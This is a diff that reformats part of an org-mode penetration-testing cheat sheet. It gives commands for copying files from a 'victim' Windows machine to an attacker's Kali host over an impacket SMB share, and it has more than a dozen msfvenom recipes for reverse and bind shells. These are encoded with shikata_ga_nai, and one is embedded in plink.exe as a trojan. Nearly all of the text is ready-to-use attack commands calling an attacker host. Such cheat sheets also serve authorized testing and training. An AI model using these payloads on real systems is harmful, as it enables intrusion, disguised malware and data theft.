@@ -21,15 +21,14 @@ C:\Windows> lget mimikatz.log
 * Transfer file via SMB 
 
 Make a smb share 
-#+begin_example
-----------------------
+
 from your kali
------------------------------
+#+begin_example
 impacket-smbserver -smb2support <share_name> <path>
-eg,
 impacket-smbserver -smb2support test .
---------------------------------------------------
+#+end_example
 then from victim,
+#+begin_example
 net use \\<kali_ip>\test
 
 then
@@ -41,60 +40,79 @@ CMD > copy filename.txt \\kali_ip\test\
 if got error, try to make a share from your kali with username password
  #+begin_example
 impacket-smbserver -smb2support test . -username df -password df
-
+ #+end_example
 then from victim
+ #+begin_example
 net use \\kali_ip\test /u:df df
+ #+end_example
+
 then
+ #+begin_example
 PS> cp filename.txt \\kali_ip\test\
 or
 CMD > copy filename.txt \\kali_ip\test\
   #+end_example
 * MSFVenom
   
-  #+begin_example
+
 PHP reverse shell
+  #+begin_example
 msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php
-
+ #+end_example
 Java WAR reverse shell
+  #+begin_example
 msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war
-
+ #+end_example
 Linux bind shell
+  #+begin_example
 msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai
-
+ #+end_example
 Linux FreeBSD reverse shell
+  #+begin_example
 msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf
-
+ #+end_example
 Linux C reverse shell
+  #+begin_example
 msfvenom  -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c
-
+ #+end_example
 Windows non staged reverse shell
+  #+begin_example
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe
-
+ #+end_example
 Windows Staged (Meterpreter) reverse shell
+  #+begin_example
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe
-
+ #+end_example
 Windows Python reverse shell
+  #+begin_example
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py
-
+ #+end_example
 Windows ASP reverse shell
+  #+begin_example
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp
-
+ #+end_example
 Windows ASPX reverse shell
+  #+begin_example
 msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
-
+ #+end_example
 Windows JavaScript reverse shell with nops
+  #+begin_example
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f js_le -e generic/none -n 18
-
+ #+end_example
 Windows Powershell reverse shell
+  #+begin_example
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1
-
+ #+end_example
 Windows reverse shell excluding bad characters
+  #+begin_example
 msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai
-
+ #+end_example
 Windows x64 bit reverse shell
+  #+begin_example
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe
-
+ #+end_example
 Windows reverse shell embedded into plink
+  #+begin_example
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
   #+end_example
 * Reverse Shells
